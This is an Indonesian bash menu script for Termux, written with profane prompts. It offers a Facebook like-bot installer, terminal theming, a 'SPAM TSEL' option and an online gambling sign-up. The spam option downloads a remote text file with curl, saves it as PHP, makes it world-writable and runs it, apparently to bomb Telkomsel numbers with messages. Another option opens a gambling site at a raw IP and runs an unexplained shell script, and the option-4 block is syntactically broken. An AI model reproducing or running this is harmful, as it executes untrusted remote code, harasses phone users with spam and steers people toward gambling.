#Author Faizul
#Not Recode Asu
bi='\033[34;1m' #biru
ij='\033[32;1m' #ijo
pr='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
or='\033[1;38;5;208m' #Orange
clear
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'
#gantikodewarna
k="\033[33;1m"
m="\033[31;1m"
pu="\033[39;1m"
p="\033[36;1m"
b="\033[34;1m"
h="\033[32;1m"
JAM=`date +%H`
MENIT=`date +%M`
DETIK=`date +%S`
TANGGAL=`date +%d`
BULAN=`date +%m`
TAHUN=`date +%Y`
mp="\033[41;1;39m"
o="\033[0m"
clear
echo
echo "         ${m}[ ${pu}TIME ZONE INDONESIA ${m}]"
echo "${b}   ╔════════╗${b} ╔═══════🕜═╗${b} ╔═══════🕛═╗"
echo "${b}   ║${k}JAM:"${m}[${pu}$JAM${m}]${b}║~${b}║${k}MENIT:"${m}[${pu}$MENIT${m}]${b}║${b}~║${k}DETIK:${m}["${pu}$DETIK${m}]${b}║
echo "${b}   ╚════════╝${b} ╚══════════╝${b} ╚══════════╝"
echo "               ${m}[ ${pu}KALENDER ${m}]"
echo "${b}╔════════════╗${b} ╔══════════╗${b} ╔════════════╗"
echo "${b}║${k}TANGGAL:"${m}[${pu}$TANGGAL${m}]${b}║${b}~║${k}BULAN:"${m}[${pu}$BULAN${m}]${b}║${b}~║${k}TAHUN:${m}["${pu}$TAHUN${m}]${b}║
echo "${b}╚════════════╝${b} ╚══════════╝${b} ╚════════════╝"
echo "${k}<════════════════════════════════════════>"
echo


limit=100
sleep 1
echo " \033[31;1m    ▇▇▇▇▇▇▇"
echo "\033[37;1m     ▇▇▇▇▇▇▇"
echo "\033[31;1mSELAMAT DATANG \033[37;1mDi Tools Faizul Kontol lu"
sleep 1
echo -n "[ NAMA LU SIAPA PEPEK ]:"
read nama;
sleep 3
echo "Hallo salam kenal Sad \033[31;1m[$nama]"
sleep 3
echo "\033[32;1mJangan Lupa subscribe channel admin woke:)"
termux-open-url "https://www.youtube.com/channel/UCSxkYGsMV5DvXz4GQJskl9Q"
sleep 5
echo $me "
░█─▄▀ ── █▀▄▀█ █▀▀▄ █▀▀   | ●AUTHOR : Faizul
░█▀▄─ ▀▀ █─▀─█ █▀▀▄ █▀▀   |-----------------------|
░█─░█ ── ▀───▀ ▀▀▀─ ▀──   | ●DATE : 23/10/2020
                             |-----------------------|"
                             
  
 echo $ij "
     \n\t\033[31;1m~  ~  ~\033[31;1m┌∩┐\033[31;1m(\033[31;1m◣_◢\033[31;1m)\033[31;1m┌∩┐\033[31;1m~  ~  ~
     \t\033[31;1m   ●MENU MBF V3
     \t\033[31;1m -------------------------\033[31;1m\n         
════════════════════════════════════════════  
[1] ●BOT LIKE FACEBOOK
════════════════════════════════════════════
[2] ●EDIT TAMPILAN TERMUX
════════════════════════════════════════════
[3] ●SPAM TSEL
════════════════════════════════════════════
[4] ●DAFTAR HOKISLOOT8I JUDI ONLINE
════════════════════════════════════════════
┗────[99] EXIT/TOOLS"
echo '\033[31;1m'
read -p "root@Pilih Number > " bro


if [ $bro = 1 ] || [ $bro = 1 ]
then
sleep 2
echo $ij "MENGINSTALL BOT"
sleep 10
echo $ij "DONE"
sleep 7
pip2 install rsa
pip2 install requests
pip2 install thrift==0.9.3
pkg install git
pkg install nano
echo $me "INSTALL CLONE"
git clone https://github.com/Acil95/botlike
cd botlike
php bot.php
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
sleep 5
echo $me "MENGEDIT TAMPILAN"
sleep 5
echo $ij "DONE"
sleep 5
pkg update && pkg upgrade
pkg install ruby cowsay toilet figlet
pkg install neofetch
pkg install nano
pkg install ncurses-utils
pkg install ruby
pkg install lolcat
pkg install cowsay
gem install lolcat
nano .bashrc
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
sleep 5
echo $ij "MENGINSTALL SPAMTSELL"
sleep 10
echo $ij "DONE"
sleep 5
pkg install curl 
pkg install php 
curl -s http://files-store.theprivat.ml/uploads/bombtsel.txt > bombtsel.php 
chmod 777 bombtsel.php
php bombtsel.php
fi

if [ $bro = 4 ] || [ $bro = 4 ]
echo $ij "MASUK KE WEBHOKI"
sleep 10
echo $ij "WEBSITE PENGHASIL DUIT JUDI ONLINE"
sleep 5
termux-open-url "http://54.254.177.115/reg_mobile"
cd NOT-VPN
sh Mr_pepek117.sh
fi


if  [ $bro = 99 ] || [ $bro = 99 ]
then
echo $cyan  "Subscribe Channel Htc Ctr Gaming "
sleep 1
exit
fi

